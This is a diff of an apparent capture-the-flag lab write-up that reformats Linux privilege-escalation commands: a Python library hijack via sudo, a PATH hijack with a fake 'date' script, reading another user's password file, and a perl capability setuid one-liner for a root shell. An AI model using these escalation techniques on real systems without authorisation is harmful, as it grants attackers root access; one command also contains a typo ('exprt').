@@ -81,39 +81,55 @@ So how did I switch the user ?
 
 It gave me the user rabbit which means I successfully managed to switch my first privilege.
 
-```bash
-cat > random.py << EOF
-import os
-os.system("/bin/bash")
-EOF
-```
+>`cat > random.py << EOF`
+
+>`import os`
+
+>`os.system("/bin/bash")`
+
+>`EOF`
+
 >`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
 
+
 ![](images/2025-12-11_12-20.png)
+
 
 Now we made a date file so that we can read the password file and switch to hatter user
 you can follow below commands. 
 
 >`cat > date << EOF`
+
 > `#!/bin/bash`
+
 > `/bin/bash`
+
 > `EOF`
-> 
-` chmod +x date`
-` exprt PATH=/home/rabbit:$PATH`
-` ./teaParty`
+
+
+>` chmod +x date`
+
+>` exprt PATH=/home/rabbit:$PATH`
+
+>` ./teaParty`
 
 We now have permission to access the hatter folder and read the password.txt
+
 >`cd /home/hatter`
+
 >`cat password.txt`
 
 ![](images/2025-12-11_13-01.png)
+
 
 we will use the command :
 >`getcap -r / 2>/dev/null`
 
 ![](images/2025-12-11_13-02.png)
+
+
 There is perl capability that we can exploit.
+
 >`https://gtfobins.github.io/gtfobins/perl/`
 
 >`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
